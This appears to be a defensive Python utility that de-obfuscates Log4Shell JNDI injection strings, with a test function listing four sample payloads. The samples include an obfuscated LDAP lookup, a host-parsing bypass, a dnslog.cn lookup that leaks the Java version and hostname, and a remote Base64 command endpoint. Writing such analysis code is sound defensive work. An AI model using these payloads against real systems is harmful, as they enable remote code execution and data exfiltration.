import re


def parse(exp: str):
    """Tries to extract typical obfuscated jndi payloads"""
    result = "${"

    # Replace single obfuscated characters
    for substitution in re.findall(r"\$\{[^\{]+:\-[^\{]\}", exp):
        exp = exp.replace(substitution, substitution[-2])

    for lowupper in re.findall(r"\$\{(?:lower|upper):[^\{]\}", exp):
        exp = exp.replace(lowupper, lowupper[-2])

    sub_exps = exp[2:-1].split("${")
    for sub_exp in sub_exps:
        if len(sub_exp) == 0:
            continue

        # Try to identify ENV and prefix them with ${
        elif sub_exp.count(":") <= 1 or "sys:" in sub_exp or "env:" in sub_exp:
            result += "${" + sub_exp
        # JNDI strings
        elif re.match(r"jndi:[a-zA-Z]{3,4}:[/]{1,2}", sub_exp):
            # If this is a second or third jndi expression, we need to prefix it with ${
            if len(result) > 2:
                result += "${"
            result += sub_exp
    result += "}"
    return result


def test():
    expressions = [
        "${${cywqFn:aWJp:YXN:V:-j}${FndP:nSIUr:pJbLx:R:KF:-n}${knSFVj:EgkBg:-d}${RCFNT:cYMi:yRAS:hVn:-i}${XzOJt:YYM:M:NVahp:-:}${WPb:Y:jTeC:BgV:-l}${R:n:SOjjn:Y:YQT:-d}${ihFJ:FDiQy:-a}${JjH:VMFPM:KAckNV:yxFj:B:-p}${O:Caf:a:c:-:}${b:NLI:z:hMRSa:wGN:-/}${yYyyHt:hBYua:-/}${XbeEIz:gQryAt:-1}${uKdHwu:ynn:mhUqe:zO:QToeAb:-2}${bOHsD:nMlNF:uh:Fcy:PYK:-7}${UhWr:-.}${tUXKLg:rSsAEP:lDOD:S:-0}${B:-.}${iVxER:ERapiN:mBEb:-0}${ip:-.}${BqWhS:-1}${PyTrWo:MvSO:oaUOo:-:}${QjA:tHIoP:G:ILLK:-1}${U:AMi:-0}${NmKw:-9}${B:-9}${J:EI:cWy:XqyW:-/}${HMEf:EVlAY:kDTKiP:-o}${MK:jBUe:c:-b}${aE:T:rpBgI:SBX:xp:-j}}",
        "${jndi:ldap://127.0.0.1#doma.in:1389/a}",
        "${jndi:ldap://jv-${sys:java.version}-hn-${hostName}.subdomain.dnslog.cn/exp}",
        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:12344/Basic/Command/Base64/Base64EncodedStuff}"
    ]

    for exp in expressions:
        print(parse(exp))
